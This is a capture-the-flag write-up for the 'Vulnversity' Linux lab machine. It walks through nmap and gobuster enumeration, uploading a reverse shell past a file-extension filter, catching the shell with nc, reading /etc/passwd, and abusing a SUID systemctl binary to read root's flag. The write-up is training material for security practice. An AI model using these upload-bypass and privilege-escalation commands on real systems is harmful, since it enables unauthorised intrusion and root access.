# Vulnversity - Linux

**IP may change over the document**

## Enumeration

### Nmap: `nmap -sV 10.10.169.111 -oN nmap-initial`

```
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
```

### Gobuster: `gobuster dir -u http://10.10.169.111:3333 -w ../common_wl.txt | tee gobuster-scan`

```
/.hta                 (Status: 403) [Size: 294]
/.htpasswd            (Status: 403) [Size: 299]
/.htaccess            (Status: 403) [Size: 299]
/css                  (Status: 301) [Size: 319] [--> http://10.10.169.111:3333/css/]
/fonts                (Status: 301) [Size: 321] [--> http://10.10.169.111:3333/fonts/]
/images               (Status: 301) [Size: 322] [--> http://10.10.169.111:3333/images/]
/index.html           (Status: 200) [Size: 33014]                                      
/internal             (Status: 301) [Size: 324] [--> http://10.10.169.111:3333/internal/]
/js                   (Status: 301) [Size: 318] [--> http://10.10.169.111:3333/js/]      
/server-status        (Status: 403) [Size: 303]                                          
```

**/internal/** seems to have some sort of upload page. It's not taking \*.php files. Trying to upload a reverse shell in \*.phtml... It works.

Running gobuster again on **/internal/** directory we get:

```
/.hta                 (Status: 403) [Size: 303]
/.htaccess            (Status: 403) [Size: 308]
/.htpasswd            (Status: 403) [Size: 308]
/css                  (Status: 301) [Size: 328] [--> http://10.10.169.111:3333/internal/css/]
/index.php            (Status: 200) [Size: 525]                                              
/uploads              (Status: 301) [Size: 332] [--> http://10.10.169.111:3333/internal/uploads/]
```

Checking **/internal/uploads/** we can see our shell. Let's connect to reverse shell script using nc now.


`nc -lvp 6565` : will start listening on the port 6565 and then let's click on the uploaded shell on browser window. We got a connection...

Stabilizing shell using following:

```bash
python3 -c "import pty; pty.spawn('/bin/bash')"
CTRL+z
stty raw -echo; fg 
xterm=256-xtermcolor
```

## User.txt

Let's see the users on system: `grep -E "/bin/.*sh" /etc/passwd`

```
root:x:0:0:root:/root:/bin/bash
bill:x:1000:1000:,,,:/home/bill:/bin/bash
```

The user flag is at */home/bill* directory and is world readable.

## Root.txt

Let's figure out if there is any suid enabled binary for exploitation using find

`find / -perm -u=s -type f 2>/dev/null`

`/bin/systemctl` - lets check this out in [gftobins](https://gtfobins.github.io/gtfobins/systemctl/)

```bash
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/root_file"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
```

`/bin/systemctl enable --now $TF` : this may result in a message about *[Install]* section being not found in the service file. Just ignore it and give it a few seconds and it will be writing your *root.txt* file to */tmp/root_file* 

Now just cat the flag found in */tmp/root_file*.
